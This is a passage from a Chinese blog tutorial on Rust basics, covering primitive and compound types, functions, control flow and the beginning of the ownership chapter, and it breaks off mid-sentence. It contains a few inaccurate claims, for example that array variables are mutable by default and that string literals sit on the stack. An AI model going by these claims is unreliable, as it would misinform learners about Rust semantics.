remainder = 43 % 5;&#125;</code></pre><h5 id="布尔值"><a href="#布尔值" class="headerlink" title="布尔值"></a>布尔值</h5><p>布尔值的大小为 1 byte，有 <code>true</code> 和 <code>false</code> 这两个可能的值。</p><p>示例：</p><pre><code class="rust">let t = true;let f: bool = false; // 显式指定类型</code></pre><h5 id="字符类型"><a href="#字符类型" class="headerlink" title="字符类型"></a>字符类型</h5><p>Rust 中字符类型（<code>char</code>）使用单引号字面量，用于存储单个字符。Rust 的 <code>char</code> 类型在编程语言中比较特殊，它的大小为 4 bytes，表示一个 Unicode 标量值。</p><p>示例：</p><pre><code class="rust">let c = &#39;z&#39;;let z = &#39;ℤ&#39;;let 汉 = &#39;好&#39;;let heart_eyed_cat = &#39;😻&#39;;</code></pre><p>可以注意到，Rust 是支持非英文变量名的。</p><h4 id="复合类型"><a href="#复合类型" class="headerlink" title="复合类型"></a>复合类型</h4><p>复合类型是由多个数据类型组合成的一种数据类型，Rust 有两种原始的复合类型：Tuple（元组）和 Array（数组）。</p><h5 id="Tuple"><a href="#Tuple" class="headerlink" title="Tuple"></a>Tuple</h5><p>元组的大小固定，一旦被声明，其大小就不可修改。</p><p>创建元组：</p><pre><code class="rust">fn main() &#123;    let tup: (i32, f64, u8) = (500, 6.4, 1);&#125;</code></pre><p>上面的代码创建了一个由 <code>i32</code>，<code>f64</code> 和 <code>u8</code> 三个类型组成的元组 <code>tup</code>，并初始化其值。</p><p>从元组中取值：</p><pre><code class="rust">fn main() &#123;    let tup: (i32, f64, u8) = (500, 6.4, 1);    let (x, y, z) = tup;    println!(&quot;The value of x is: &#123;&#125;&quot;, x); // The value of x is: 500    println!(&quot;The value of y is: &#123;&#125;&quot;, y); // The value of y is: 6.4    println!(&quot;The value of z is: &#123;&#125;&quot;, z); // The value of z is: 1&#125;</code></pre><p>类似 <code>let (x, y, z) = tup</code> 将一个元组赋值给多个变量的用法被称为解构（<em>destructuring</em>）。</p><p>还可以直接根据下标取值：</p><pre><code class="rust">fn main() &#123;    let tup: (i32, f64, u8) = (500, 6.4, 1);    println!(&quot;The value of x is: &#123;&#125;&quot;, tup.0); // The value of x is: 500    println!(&quot;The value of y is: &#123;&#125;&quot;, tup.1); // The value of y is: 6.4    println!(&quot;The value of z is: &#123;&#125;&quot;, tup.2); // The value of z is: 1&#125;</code></pre><p>没有任何内容的元组，即 <code>()</code>，是一种只包含一个值的元组，它被称为单元类型（<em>unit type</em>），这样的表达式返回的值被称为单元值（<em>unit value</em>）。</p><h5 id="Array"><a href="#Array" class="headerlink" title="Array"></a>Array</h5><p>数组和元组的差别很大，前者只能包含相同数据类型的元素，后者则不然。不过 Rust 中的数组和元组一样是固定长度的，不可改变。</p><p>数组的初始化：</p><pre><code class="rust">fn main() &#123;    let a = [1, 2, 3, 4, 5]; // 初始化    let b: [i32; 5] = [1, 2, 3, 4, 5]; // [type; length]&#125;</code></pre><p>数组特殊在于其一般分配在内存空间中的栈（stack）上而不是堆（heap）上，这在后文会深入讨论。当需要固定长度的一系列元素时，用 数组会比较合适。Rust 中还有一种可变的数组，即 <strong>vector</strong>，但它是由标准库提供的而不是 Rust 语言本身，一般来说 vector 会更常用一些。</p><p>数组的声明和取值：</p><p>和其他大多数编程语言相同，Rust 中取数组元素使用下标，如 <code>a[0]</code>。</p><pre><code class="rust">fn main() &#123;    let a: [isize; 5]; // 声明长度为 5 的空数组    println!(&quot;&#123;&#125;&quot;, a[0]);&#125;</code></pre><p>上面的代码会直接编译不通过，报 <code>use of possibly-uninitialized `a` </code> 错误，这是因为 Rust 禁止使用未初始化的变量，改成下面的代码就可以了：</p><pre><code class="rust">fn main() &#123;    let a: [isize; 5];    a = [3; 5]; // 将一个长度为 5，内容全部为 3 的数组赋给变量 a    println!(&quot;&#123;&#125;&quot;, a[0]); // 3&#125;</code></pre><p><code>a = [3; 5]</code> 等同于 <code>a = [3, 3, 3, 3, 3]</code>。</p><p>我们注意到一件事情：数组变量默认是 <em>mutable</em> 的，不需要使用 <code>mut</code> 修饰就可以对其重新赋值。</p><p>如果我们访问数组时越界会怎么样？在某些编程语言中越界并不会造成程序本身停止或异常，但会给内存上的数据造成破坏。在 Rust 中，编译器会自动检查数组访问的下标是否越界，如果越界则无法编译通过。当下标的值在程序运行时才会确定（如接收用户输入的下标值）时，越界会导致程序 <strong>panic</strong>，并随之中止。</p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>在大多数编程语言中，函数都是相当重要的存在，Rust 也不例外，函数的使用无处不在，比如前文中大量使用的 <code>main</code> 函数。</p><h4 id="命名规范"><a href="#命名规范" class="headerlink" title="命名规范"></a>命名规范</h4><p>Rust 使用 <code>fn</code> 关键字声明函数，并使用 snake case 命名风格，所有的函数名使用小写字母并使用 <code>_</code> 分隔。Rust 并不在乎函数的定义位置，无论其在代码中是位于 <code>main</code> 函数之前还是之后。</p><pre><code class="rust">fn sample_func() &#123;    println!(&quot;Sample function.&quot;);&#125;fn hello_world() &#123;    println!(&quot;Hello world.&quot;);&#125;</code></pre><p>调用函数也很简单，例如 <code>sample_func()</code>：</p><pre><code class="rust">fn main() &#123;    sample_func(); // Sample function.&#125;fn sample_func() &#123;    println!(&quot;Sample function.&quot;);&#125;</code></pre><h4 id="函数参数"><a href="#函数参数" class="headerlink" title="函数参数"></a>函数参数</h4><p>函数参数用法：</p><pre><code class="rust">fn main() &#123;    another_function(5);&#125;fn another_function(x: i32) &#123;    println!(&quot;The value of x is: &#123;&#125;&quot;, x); // The value of x is: 5&#125;</code></pre><p>多个参数：</p><pre><code class="rust">fn main() &#123;    another_function(5, 6);&#125;fn another_function(x: i32, y: i32) &#123;    println!(&quot;The value of x is: &#123;&#125;&quot;, x); // The value of x is: 5    println!(&quot;The value of y is: &#123;&#125;&quot;, y); // The value of y is: 6&#125;</code></pre><p>函数的每个参数都必须指明其类型。</p><h4 id="函数返回值"><a href="#函数返回值" class="headerlink" title="函数返回值"></a>函数返回值</h4><p>函数可以向调用它们的代码返回值。我们不命名返回值，但在箭头（<code>-&gt;</code>）后面声明它们的类型。在 Rust 中，函数的返回值与函数体块中最终表达式的值同义。通过使用 <code>return</code> 关键字并指定值，可以提前从函数返回，但大多数函数隐式返回<strong>最后一个表达式</strong>。</p><p>Rust 中函数返回值是无名的，只需要指定其类型：</p><pre><code class="rust">fn five() -&gt; i32 &#123;    5 // 等同于 `return 5;`&#125;fn plus_one(x: i32) -&gt; i32 &#123;    return x + 1; // 可去掉 return，使用 `x + 1` 代替&#125;fn main() &#123;    let mut x = five();    x = plus_one(x);    println!(&quot;The value of x is: &#123;&#125;&quot;, x); // The value of x is: 6&#125;</code></pre><p>注意，作为函数返回值的表达式，其后是没有 <code>;</code> 的，如上面的 <code>5</code>，加上分号就变成了普通表达式，而不是返回值。如果把 <code>plus_one()</code> 的 <code>return x + 1;</code> 语句改为 <code>x + 1;</code> 编译会报错，因为这个函数不再返回任何值，但它明确定义了会返回 <code>i32</code> 数值。</p><p><code>plus_one</code> 函数还可以改成如下的形式：</p><pre><code class="rust">fn plus_one(mut x: i32) -&gt; i32 &#123;    x = x + 1;    x&#125;</code></pre><p>这和原来的 <code>plus_one</code> 函数是等价的，只不过使用了 <code>mut</code> 修饰符让 <code>x</code> 可变。</p><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>注释很简单，例如单行注释：</p><pre><code class="rust">// This is a comment.</code></pre><p>多行注释：</p><pre><code class="rust">// Multiple lines// comments.</code></pre><pre><code class="rust">fn main() &#123;    println!(&quot;Hello World!&quot;); // Hello World!&#125;</code></pre><p>Rust 中还有一种文档注释，但暂时用不到，在之后会介绍。</p><h3 id="控制流"><a href="#控制流" class="headerlink" title="控制流"></a>控制流</h3><p>控制流是很基本的概念，Rust 同样包含了多种基本的控制流。</p><h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><p>Rust 中 <code>if</code> 语句不需要使用括号：</p><pre><code class="rust">fn main() &#123;    let number = 3;    if number &lt; 5 &#123;        println!(&quot;number &lt; 5&quot;); // number &lt; 5    &#125; else &#123;        println!(&quot;number &gt;= 5&quot;);    &#125;&#125;</code></pre><p>在 Rust 中，<code>if</code> 表达式只能用布尔值作为条件，即只能判断布尔变量以及条件表达式。</p><p>还可以使用 <code>else if</code> 表达式来增加分支，只有一个分支会被执行，一旦某个分支为 <code>true</code>，就不会判断下一个分支：</p><pre><code class="rust">fn main() &#123;    let number = 6;    if number % 4 == 0 &#123;        println!(&quot;number is divisible by 4&quot;);    &#125; else if number % 3 == 0 &#123;        println!(&quot;number is divisible by 3&quot;); // number is divisible by 3    &#125; else if number % 2 == 0 &#123;        println!(&quot;number is divisible by 2&quot;);    &#125; else &#123;        println!(&quot;number is not divisible by 4, 3, or 2&quot;);    &#125;&#125;</code></pre><p>使用 <code>if</code> 语句，可以实现下面的条件表达式，类似于某些语言中的三元运算符：</p><pre><code class="rust">fn main() &#123;    let condition = true;    let number = if condition &#123; 5 &#125; else &#123; 6 &#125;;    println!(&quot;The value of number is: &#123;&#125;&quot;, number); // 5&#125;</code></pre><p>其中，根据前面有关函数返回值的学习，我们知道 <code>&#123;&#125;</code> 中没有分号结尾的作为返回值，由此我们可以写出下面的语句，同样是正确的：</p><pre><code class="rust">fn main() &#123;    let condition = true;    let number = if condition &#123;let x = 2; x+2&#125; else &#123;let x = 1; x+1&#125;;    println!(&quot;The value of number is: &#123;&#125;&quot;, number); // 4&#125;</code></pre><p>然而 <code>if</code> 和 <code>else</code> 语句块的值不能为不同类型，这是无法编译通过的，这是因为 Rust 需要在编译期确定所有变量的类型，如果 <code>if</code> 和 <code>else</code> 能够得到不同类型的结果，那么也就无法知道变量 <code>number</code> 的类型。不过，这并不代表这样的实现是不可能的，如果编译器必须跟踪任何变量的多个假设类型，那么编译器将更加复杂，对代码的保证也会更少。</p><h4 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h4><p>Rust 有三种循环语句，<code>loop</code>、<code>while</code> 和 <code>for</code>。</p><h5 id="loop"><a href="#loop" class="headerlink" title="loop"></a>loop</h5><p>简而言之，<code>loop</code> 语句就是无限循环，它没有条件语句，也就不能在循环上让其退出。但是 <code>loop</code> 可以通过循环体内的语句退出：</p><pre><code class="rust">fn main() &#123;    let mut count = 0; // 统计循环次数    loop &#123;        if count == 5 &#123;break;&#125; // 当 count 等于 5 则退出循环        println!(&quot;hello&quot;);        count += 1; // 次数加一    &#125;&#125;</code></pre><p>毋庸置疑，上面的代码会输出五行 <code>hello</code>。</p><p>关于 <code>loop</code> 语句还有一点比较特别的是，它可以返回值：</p><pre><code class="rust">fn main() &#123;    let mut count = 0;    let result = loop &#123;        if count == 5 &#123;break count + 1;&#125;        println!(&quot;hello&quot;);        count += 1;    &#125;;    println!(&quot;The value of result is: &#123;&#125;&quot;, result); // The value of result is: 6&#125;</code></pre><p>可以看到，<code>break</code> 关键字后面跟返回值，就能赋值给 <code>result</code>，当执行到 <code>break</code> 语句后 <code>loop</code> 立即返回了 <code>count + 1</code>。</p><p>结合前面的内容，可以知道下面的代码也是正确的：</p><pre><code class="rust">fn main() &#123;    let mut count = 0;    let result = loop &#123;        if count == 5 &#123;break &#123;let x = 12; count + x&#125;;&#125;        println!(&quot;hello&quot;);        count += 1;    &#125;;    println!(&quot;The value of result is: &#123;&#125;&quot;, result); // The value of result is: 17&#125;</code></pre><p><code>&#123;let x = 12; count + x&#125;</code> 的值为 <code>count + x</code> 即 17，通过 <code>break</code> 返回给 <code>result</code>。</p><h5 id="While"><a href="#While" class="headerlink" title="While"></a>While</h5><p>循环语句中写循环条件可以让循环处理更简单，Rust 提供了 <code>while</code> 循环支持指定循环条件：</p><pre><code class="rust">fn main() &#123;    let mut number = 3;    while number != 0 &#123;        println!(&quot;&#123;&#125;!&quot;, number);        number -= 1;    &#125;    println!(&quot;LIFTOFF!!!&quot;); // LIFTOFF!!!&#125;</code></pre><p>这和其他编程语言没什么大的区别，不再赘述。</p><h5 id="for"><a href="#for" class="headerlink" title="for"></a>for</h5><p><code>for</code> 循环用于迭代元素集合，如数组（Array），这使用其他两种循环也可以做到：</p><pre><code class="rust">fn main() &#123;    let a = [10, 20, 30, 40, 50];    let mut index = 0;    while index &lt; 5 &#123;        println!(&quot;the value is: &#123;&#125;&quot;, a[index]);        index += 1;    &#125;&#125;// 10// 20// 30// 40// 50</code></pre><p>但使用 <code>for</code> 循环可以将上面的语句简化为下面的：</p><pre><code class="rust">fn main() &#123;    let a = [10, 20, 30, 40, 50];    for element in a.iter() &#123;        println!(&quot;the value is: &#123;&#125;&quot;, element);    &#125;&#125;// 10// 20// 30// 40// 50</code></pre><p>这样的代码会更安全，因为不需要指定数组下标之类，不存在越界的问题。</p><p>下面的语句可以用于生成一个数字范围，类似 Python 中的写法：</p><pre><code class="rust">fn main() &#123;    for number in 1..4 &#123;        println!(&quot;&#123;&#125;!&quot;, number);    &#125;    println!(&quot;LIFTOFF!!!&quot;);&#125;// 1!// 2!// 3!// LIFTOFF!!!</code></pre><p><code>1..4</code> 很明显，是用来生成范围 $[1,4)$ 的三个数字，接着使用 <code>for</code> 循环遍历这三个数字并输出。</p><p>我们可以写出如下的代码来指定下标从数组中取值：</p><pre><code class="rust">fn main() &#123;    let arr = [10, 20, 30, 40, 50];    for number in 3..5 &#123;        println!(&quot;&#123;&#125;&quot;, arr[number]);    &#125;&#125;// 40// 50</code></pre><h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><ol><li><p>用目前学习的内容写一个计算斐波那契数列的函数：</p><p> 动态规划解法：</p><pre><code class="rust">fn fib(mut n: i32) &#123;    let mut pre = 1;    let mut post = 1;    while n &gt; 2 &#123;        let tmp = post;        post += pre;        pre = tmp;        n -= 1;    &#125;    println!(&quot;&#123;&#125;&quot;, post);&#125;fn main() &#123;    fib(1);  // 1    fib(2);  // 1    fib(3);  // 2    fib(10); // 55&#125;</code></pre></li></ol><h2 id="所有权"><a href="#所有权" class="headerlink" title="所有权"></a>所有权</h2><p>所有权（Ownership）是 Rust 最独特的特性，它使 Rust 能够在不需要垃圾收集器的情况下保证内存安全。因此，了解所有权在 Rust 中的作用非常重要。在本章中，我们将讨论所有权以及几个相关特性：借用（borrowing）、切片（slices）以及 Rust 如何在内存中布局数据。</p><blockquote><p>注：Ownership 应当是 Rust 较复杂的一部分，但对于理解和掌握 Rust 编程相当重要，因此本文遵循 The Rust Programming Language 的章节安排，先介绍该部分。</p></blockquote><h3 id="什么是所有权"><a href="#什么是所有权" class="headerlink" title="什么是所有权"></a>什么是所有权</h3><p>所有程序在运行的时候都必须管理它们使用计算机内存的方式。有些编程语言使用垃圾回收机制（GC）来不断地寻找不再使用的内存（如 Java、Go）并进行释放，开发者不需要手动释放内存；还有些编程语言中，开发者必须手动分配和释放内存（如 C、C++）。Rust 则另辟蹊径：内存通过一个所有权系统来管理，它具有一组编译器在编译时检查的规则。当程序运行时，所有权的任何功能都不会影响程序的效率。</p><p>Ownership 对大多数学习 Rust 的人来说是一个全新的概念，因此需要花一些时间来学习和适应。</p><blockquote><p><strong>栈（Stack）和堆（Heap）</strong></p><p>在许多编程语言中，开发者不必经常考虑栈和堆。但是在像 Rust 这样的系统级编程语言中，值（value）是在栈上还是在堆上对<strong>语言的行为</strong>以及<strong>为什么必须做出某些决定</strong>有很大的影响。下面作出简要说明。</p><p>栈和堆都是可供程序在运行时使用的内存的一部分，但它们的结构不同。类似于数据结构中栈的概念，内存中的栈空间同样满足 LIFO 的规则，不再赘述。栈上存储的所有数据的大小必须在编译期已知且固定，如果编译期无法确定一个数据的大小或者其大小可能发生改变，那它将被分配到堆上。堆的组织性较差，当数据放在堆上时，需要请求一定量的空间，然后由内存分配器在堆上找到一个足够大的空间，将该空间标记为正在使用，接着返回一个指针，即该地址的位置。这个过程被称为堆分配（<em>allocating on the heap</em>），有时简称为分配（<em>allocating</em>）。将值放到栈上不视为分配。由于指针是已知的固定大小，所以可以将指针存储在栈上，但当需要实际数据时，必须找寻指针的指向地址。</p><p>显然，在栈上分配内存更快，因为只需要从栈顶入栈就行了，而堆中由于空闲空间并不一定连续，需要花时间寻找满足的堆空间，并记录变化。</p><p>访问堆中的数据同样比访问栈上的数据慢，因为必须通过指针才能找到目标位置。现代处理器在内存中的跳跃越少，则速度越快。继续类推，考虑一家餐馆的服务员从许多表格中获取订单的例子。在去到下一张桌子之前，在一张桌子上拿到所有订单是最高效的。从表 A 获取订单，然后从表 B 获取订单，然后再从 A 获取订单，然后再从 B 获取订单将是一个慢得多的过程。同样，如果处理器处理的数据与其他数据相近（如栈上的数据），而不是距离较远（如堆上的数据），则处理器可以更好地完成其工作。在堆上分配大量空间也需要时间。</p><p>当代码调用函数时，传递到函数中的值（这里指的是函数参数，可能包括指向堆上数据的指针）和函数的局部变量被压入栈中。当函数结束（返回）时，这些值会从栈中弹出。</p><p>跟踪代码的哪些部分正在使用堆上的哪些数据，最小化堆上的重复数据量，清理堆上未使用的数据以避免耗尽空间，这些都是所有权所要解决的问题。一旦了解了所有权，就不需要经常考虑栈和堆，但是明白<strong>管理堆数据</strong>是所有权存在的原因有助于理解它为什么以这种方式工作。</p></blockquote><h4 id="Ownership-规则"><a href="#Ownership-规则" class="headerlink" title="Ownership 规则"></a>Ownership 规则</h4><p>首先牢记以下规则：</p><ul><li>Rust 中的每个值（value）都有一个称为其所有者（owner）的变量。</li><li>一次只能有一个所有者。</li><li>当所有者超出作用域范围（即程序不能访问它）时，该值将被删除。</li></ul><h4 id="变量作用域"><a href="#变量作用域" class="headerlink" title="变量作用域"></a>变量作用域</h4><p>变量作用域（Variable Scope）指的是某个变量的作用范围，即它对其他代码可见的范围。</p><p>在下面的代码中，<code>x</code> 的作用域就是整个 <code>main</code> 函数，在 <code>main</code> 函数内 <code>x</code> 可以被任何语法访问。</p><pre><code class="rust">fn main() &#123;    let x = 1;    println!(&quot;&#123;&#125;&quot;, x); // 1&#125;</code></pre><p>在 Rust 中，可以使用 <code>&#123;&#125;</code> 指定一块作用域：</p><pre><code class="rust">fn main() &#123;    let x = 5;    &#123;        let y = 6;    &#125;    println!(&quot;&#123;&#125;&quot;, x);    println!(&quot;&#123;&#125;&quot;, y);&#125;</code></pre><p>上面的代码不能通过编译，会出现 <code>cannot find value `y` in this scope</code> 的报错，这是因为<code>y</code>在一个独立的作用域里，外部无法访问到它。</p><p>作用域能够访问到其外部的作用域，因此下面的代码中，<code>x</code> 和 <code>y</code> 都能被打印出来：</p><pre><code class="rust">fn main() &#123;    let x = 5;    &#123;        let y = 6;        println!(&quot;&#123;&#125;&quot;, x); // 5        println!(&quot;&#123;&#125;&quot;, y); // 6    &#125;    // println!(&quot;&#123;&#125;&quot;, x);    // println!(&quot;&#123;&#125;&quot;, y);&#125;</code></pre><p>现在来分析一下作用域的生命周期：</p><pre><code class="rust">fn main() &#123;    &#123;                      // 变量 s 不可用, 因为它还没有被声明        let s = &quot;hello&quot;;   // 变量 s 现在可用        // 处理 s 相关的代码    &#125;                      // 作用域结束，s 不再可用&#125;</code></pre><p>也就是说 <code>s</code> 的生命周期是从其被声明直到遇到 <code>&#125;</code> 其作用域结束的这个区间。</p><p>就目前来看，Rust 中变量作用域机制和其他很多编程语言中的变量作用域机制很近似。现在我们引入字符串类型再进行探讨。</p><h4 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h4><p>前面介绍的数据类型都存储在栈上，在它们所在的作用域结束（如函数返回）后就会被弹出栈空间。我们现在看看存储在堆上的数据，并探究 Rust 如何知道何时清理这些数据。</p><p>这里我们使用 <code>String</code>（字符串）类型作为示例，重点介绍 <code>String</code> 中与所有权相关的部分。这些部分也同样适用于其他复杂数据类型（无论它们是由标准库提供的还是由开发者自行创建的）。</p><p>我们早已经见过字符串字面量（string literals），如 <code>&quot;hello world!&quot;</code>，这是写在代码中的一段字符串。使用字符串字面量很直观也很方便，但可能并不适用于所有需要进行文本处理的情况。其中一个原因是字符串字面量是不可变（<em>immutable</em>）的，还有一个原因是字符串内容很可能是在运行时才能够被确定的（比如是由用户输入的字符串）。出于这些情况，Rust 提供了不同于字符串字面量的 <code>String</code> 类型。这个类型是在堆上分配的（而字符串字面量在栈上），因此能够存储大量在编译时未知的文本。</p><p><code>String</code> 的用法如下：</p><pre><code class="rust">let s = String::from(&quot;hello&quot;); // 使用字符串字面量创建一个 String</code></pre><p>其中，<code>::</code> 是一个运算符，在这里用于调用 <code>String</code> 类型命名空间下的 <code>from</code> 函数。</p><p>现在可以使用可变的字符串了：</p><pre><code class="rust">fn main() &#123;    let mut s = String::from(&quot;hello&quot;);    s.push_str(&quot;, world!&quot;); // push_str() 将一个字符串字面量放入一个 String 中    println!(&quot;&#123;&#125;&quot;, s); // hello, world!&#125;</code></pre><p>从字符串的例子中我们知道，字符串字面量不可变，但 <code>String</code> 可变，这是因为这两种类型处理内存的方式不同。</p><h4 id="内存和内存分配"><a href="#内存和内存分配" class="headerlink" title="内存和内存分配"></a>内存和内存分配</h4><p>由于字符串字面量是在编译时就确定的，因此它可以被直接硬编码到最终的可执行文件中。这也是字符串字面量快速并高效的原因。但其高效的前提是字符串字面量是不可变的。我们无法将<strong>在编译时大小未知</strong>或是<strong>在程序运行时大小可能会改变</strong>的文本放入二进制文件中。</p><p>对于 <code>String</code> 类型，为了支持可变的、可增长的文本，我们需要在堆上分配一定量的内存（编译时未知）来保存内容。这意味着：</p><ol><li><p>必须在运行时（runtime）从内存分配器（memory allocator）请求内存。</p></li><li><p>我们需要一种在处理完 <code>String</code> 后将内存返回给分配器的方法（即回收内存）。</p></li></ol><p>第一点由编程人员完成，通过调用如 <code>String::from</code> 的函数来实现请求所需的内存。这在编程语言中非常普遍。</p><p>然而，第二点就有一些不同了。在使用垃圾回收（<em>garbage collector, GC</em>）机制的语言中，GC 跟踪并清理不再使用的内存，编程人员无需考虑这些。如果没有 GC，编程人员就需要判断内存何时不再被使用，并调用代码显式返回（return）它，就像我们请求（request）它一样。然而完全正确地执行此操作历来是一个相当困难的编程问题。如果忘记了回收内存，轻则造成内存浪费，重则出现大量内存泄漏，导致内存占用越来越大；然而如果回收的过早，会导致某些仍需要使用的变量失效，出现悬挂指针（<em>dangling pointer</em>）问题；如果重复进行了回收，这同样会导致程序 bug。我们的任务是将 <code>allocate</code>（分配）和 <code>free</code>（回收）操作准确地配对。</p><p>Rust 采用了不同的路径：<strong>一旦占用内存的变量超出作用域，内存就会自动返回。</strong></p><p>看下面一段代码，使用了 <code>String</code> 类型声明变量 <code>s</code>：</p><pre><code class="rust">fn main() &#123;    &#123;        let s = String::from(&quot;hello&quot;); // 变量 s 被初始化        // 处理 s 相关的代码    &#125; // 作用域结束，s 不再可用&#125;</code></pre><p>注意作用域结束的地方 <code>&#125;</code>，当这个作用域结束，<code>s</code> 即不再可用，也就可以回收其内存了。Rust 在这时会调用一个特殊的函数 <code>drop</code>，<code>String</code> 的作者（author，这个作者指的是 <code>String</code> 标准库的开发者，并非使用者）可以在这里放置代码以返回内存。</p><blockquote><p>注：在 C++ 中，在项目的生命周期结束时释放资源的这种模式有时称为 <em>Resource Acquisition Is Initialization</em>（<em>RAII</em>）。如果你使用过 RAII 模式，Rust 中的 drop 函数对你来说会很熟悉。</p></blockquote><blockquote><p>【截至写下本文，我都还不会 C++，我的下半生估计是废了 o(T ヘ To)】</p></blockquote><p>上述模式对 Rust 代码的编写方式有着深远的影响。现在看起来可能很简单，但在更复杂的情况下，当我们想要让多个变量使用我们在堆上分配的数据时，代码的行为可能会出人意料。接下来让我们来探讨其中的一些情况。</p><h4 id="变量和数据交互的方式：移动"><a href="#变量和数据交互的方式：移动" class="headerlink" title="变量和数据交互的方式：移动"></a>变量和数据交互的方式：移动</h4><p>在 Rust 中，多个变量可以以不同的方式与相同的数据交互。比如下面这个例子：</p><pre><code class="rust">let x = 5;let y = x;</code></pre><p>我们大概可以猜到这是在做什么：“将值 5 绑定到 <code>x</code>，然后复制 <code>x</code> 中的值并将其绑定到 <code>y</code>。”我们现在有两个变量，<code>x</code> 和 <code>y</code>，它们都等于 5。这确实是实际的执行过程，因为整数是具有已知固定大小的简单值，这两个 5 会被压入栈。</p><p>现在我们来看看 <code>String</code> 的版本：</p><pre><code class="rust">let s1 = String::from(&quot;hello&quot;);let s2 = s1;</code></pre><p>这和固定大小的 <code>i32</code> 整数有很大的区别，它并不是从 <code>s1</code> 直接复制值并赋给 <code>s2</code> 的。我们先看看 <code>String</code> 背后的结构：</p><p><img src="/learn-rust/trpl04-01.svg" class="lazyload" data-srcset="/learn-rust/trpl04-01.svg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="String in memory"></p><blockquote><p>注：本章节的图片均取自 <a href="https://doc.rust-lang.org/book/title-page.html">The Rust Programming Language</a>。</p></blockquote><p>这和 Go 对字符串类型的实现基本相同。</p><p>其中，左边的部分是位于栈上的，右边的部分在堆上。长度（len）表示当前字符串已经占用的空间大小（以字节为单位），容量（capacity）表示可供使用的空间大小，即底层数组的实际大小（以字节为单位）。当复制 <code>s1</code> 时，仅仅是复制了栈中的部分，因此是下图的结果：</p><p><img src="/learn-rust/trpl04-02.svg" class="lazyload" data-srcset="/learn-rust/trpl04-02.svg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="s1 and s2 pointing to the same value"></p><p>由此可以看出，<code>s1</code> 和 <code>s2</code> 实际的内容是相同的。假设 Rust 同时也会复制堆数据会怎样？如下图的情况：</p><p><img src="/learn-rust/trpl04-03.svg" class="lazyload" data-srcset="/learn-rust/trpl04-03.svg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="s1 and s2 to two places"></p><p>可以预见，当字符串占用大量空间时，对其进行复制会耗费相当的时间和空间。下面我们丢掉这个假设，看实际的情况。</p><p>前面我们提到了，因为所有权机制，变量超出作用域会立即释放堆内存空间，那么对于具有相同内存空间来说的 <code>s1</code> 和 <code>s2</code>，会发生什么？显然，会调用两次 <code>drop()</code> 来释放同一块内存，这被称为<strong>双重释放</strong>（<em>double free</em>）错误，是我们之前提到的内存安全错误之一。</p><p>为了确保内存安全，在 <code>s2 = s1</code> 这条语句后，Rust 就会认为 <code>s1</code> 不再有效了，因此无需再释放 <code>s1</code>，作用域结束时释放 <code>s2</code> 即可。这直接导致了下面的现象：</p><pre><code class="rust">fn main() &#123;    let s1 = String::from(&quot;hello&quot;);    let s2 = s1;    println!(&quot;&#123;&#125;&quot;, s1);    println!(&quot;&#123;&#125;&quot;, s2);&#125;</code></pre><pre><code class="shell">$ cargo run   Compiling ownership v0.1.0error[E0382]: borrow of moved value: `s1`  --&gt; src\main.rs:15:20   |12 |     let s1 = String::from(&quot;hello&quot;);   |         -- move occurs because `s1` has type `String`, which does not implement the `Copy` trait13 | 14 |     let s2 = s1;   |              -- value moved here15 |     println!(&quot;&#123;&#125;&quot;, s1);   |                    ^^ value borrowed here after moveFor more information about this error, try `rustc --explain E0382`.error: could not compile `ownership` due to previous error</code></pre><p>可以看到，编译直接出错了，其原因是 <code>s1</code> 已经失效了。尝试修改为下面的代码，再次运行：</p><pre><code class="rust">fn main() &#123;    let s1 = String::from(&quot;hello&quot;);    println!(&quot;&#123;&#125;&quot;, s1);  // hello    let s2 = s1;    println!(&quot;&#123;&#125;&quot;, s2);  // hello&#125;</code></pre><p>这一次就正常输出了意料之中的结果。</p><p>如果你在使用其他语言时听说过<strong>浅拷贝</strong>（<em>shallow copy</em>）和<strong>深拷贝</strong>（<em>deep copy</em>）这两个术语，那么复制指针、长度和容量而不复制堆中数据的概念可能听起来像进行浅拷贝。但是由于 Rust 会让第一个变量无效，因此这个概念没有被叫做浅拷贝，它被称为<strong>移动</strong>（<em>move</em>）。在上述的例子中，我们会说 <code>s1</code> 被移动到了 <code>s2</code> 中，即把 <code>s1</code> 放到 <code>s2</code> 中并删除 <code>s1</code>。</p><p>现在，我们可以说解决了双重释放的问题。从这个设计中我们可以看出，Rust 永远不会自动创建一个“深拷贝”，因此，任何自动化的复制行为都是性能很优良的。</p><h4 id="变量和数据交互的方式：克隆"><a href="#变量和数据交互的方式：克隆" class="headerlink" title="变量和数据交互的方式：克隆"></a>变量和数据交互的方式：克隆</h4><p>移动操作会使旧变量失效，而如果想要深拷贝 <code>String</code> 的堆中数据，可以使用一种叫做 <code>clone</code> 的通用方法。</p><blockquote><p>方法（method）是一种很常见的编程语言组成部分，在后文中才会对方法进行介绍。</p></blockquote><p>下面是一个示例：</p><pre><code class="rust">fn main() &#123;    let s1 = String::from(&quot;hello&quot;);    let s2 = s1.clone();    println!(&quot;s1 = &#123;&#125;, s2 = &#123;&#125;&quot;, s1, s2);&#125;</code></pre><p>上面这段代码显式地进行了 